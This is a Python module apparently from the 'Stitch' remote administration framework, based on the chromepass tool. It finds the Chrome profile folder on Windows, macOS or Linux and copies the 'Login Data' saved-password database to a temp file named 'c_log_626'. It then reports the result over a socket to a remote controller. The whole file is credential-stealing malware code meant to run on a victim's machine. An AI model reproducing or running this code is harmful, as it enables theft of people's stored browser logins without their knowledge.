# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# based from https://github.com/hassaanaliw/chromepass/blob/master/chromepass.py
import os,sys

def get_chrome_path():
    if win_client():
        PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    if osx_client():
        PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    if lnx_client():
        PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    return PathName, True

if win_client():
    temp = 'C:\\Windows\\Temp\\'
else:
    temp = '/tmp/'

info_list = ''
path, success = get_chrome_path()
if success:
    path = os.path.join(path,"Login Data")
    new_path = os.path.join(temp,'c_log_626')
    if os.path.exists(path):
        shutil.copyfile(path, new_path)
        send(client_socket,"SUCCESS")
    else:
        err = '[!] The path "{}" does not exist.'.format(path)
        send(client_socket,err)
else:
    err = '[!] The path "{}" does not exist.'.format(path)
    send(client_socket,err)
